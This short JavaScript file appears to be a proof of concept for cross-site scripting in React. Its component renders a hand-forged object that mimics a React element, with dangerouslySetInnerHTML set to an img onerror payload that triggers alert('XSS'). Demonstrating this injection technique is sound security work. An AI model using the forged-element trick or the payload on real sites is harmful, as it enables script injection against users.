'use strict';

class Hello extends React.Component {
  render() {
    return React.createElement("div", null, {
      "_isReactElement": true,
      "_store": {
        "originalProps": {}
      },
      "type": "body",
      "props": {
        "dangerouslySetInnerHTML": {
          "__html": "<img src='whatever' onerror=\"javascript: alert('XSS')\" />"
        }
      }
    });
  }
}

ReactDOM.render(React.createElement(Hello, null), document.getElementById("hello-world"));